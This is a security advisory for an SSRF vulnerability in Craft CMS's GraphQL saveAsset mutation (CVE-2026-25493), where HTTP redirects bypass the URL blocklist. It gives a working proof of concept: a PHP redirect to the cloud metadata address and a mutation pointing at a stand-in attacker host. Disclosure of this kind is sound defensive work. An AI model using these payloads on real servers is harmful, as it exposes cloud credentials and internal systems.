# [M] Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via HTTP Redirect

## Summary
Severity: Medium
Advisory: GHSA-8jr8-7hr4-vhfx
CVE: CVE-2026-25493
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-8jr8-7hr4-vhfx
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.8.22
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.16.18

## Details
## Summary
The `saveAsset` GraphQL mutation validates the initial URL hostname and resolved IP against a blocklist, but Guzzle follows HTTP redirects by default. An attacker can bypass all SSRF protections by hosting a redirect that points to cloud metadata endpoints or any internal IP addresses.

---
## Proof of Concept
1. Host a redirect script on your server (e.g. `redirect.php`):
```php
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```
2. Send the following GraphQL mutation:
```graphql
mutation {
    save_images_Asset(_file: { 
        url: "https://attacker.com/redirect.php"
        filename: "metadata.txt"
    }) {
        id
    }
}
```
3. The application validates `attacker.com` (passes)
4. Guzzle follows the redirect to `169.254.169.254`
5. Cloud metadata is saved as an asset

---
## Mitigation
- Disable redirects.

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-8jr8-7hr4-vhfx
- https://nvd.nist.gov/vuln/detail/CVE-2026-25493
- https://github.com/craftcms/cms/commit/0974055634af68998f67850ab2045d8aaa19fa98
- https://github.com/craftcms/cms
- https://github.com/craftcms/cms/releases/tag/4.16.18
- https://github.com/craftcms/cms/releases/tag/5.8.22
